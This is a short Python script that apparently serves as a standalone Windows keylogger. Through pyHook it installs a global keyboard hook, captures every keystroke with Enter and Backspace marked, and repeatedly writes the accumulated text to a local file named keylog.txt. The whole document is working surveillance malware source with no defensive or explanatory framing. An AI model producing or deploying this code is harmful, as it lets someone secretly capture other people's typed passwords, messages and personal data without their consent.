import pyHook, pythoncom, sys, logging

file_log='keylog.txt'

def onKeyboardEvent(event):
    global store
    if event.KeyID == 13:
        key = ' <ENTER> '
    elif event.KeyID == 8:
        key = ' <BACKSPACE> '
#    logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
    else:
        key = chr(event.KeyID)
#    logging.log(10,key)
    store += key
    fp = open(file_log, 'w')
    fp.write(store)
    fp.close()
    return True

store = ''
hooks_manager=pyHook.HookManager()
hooks_manager.KeyDown=onKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
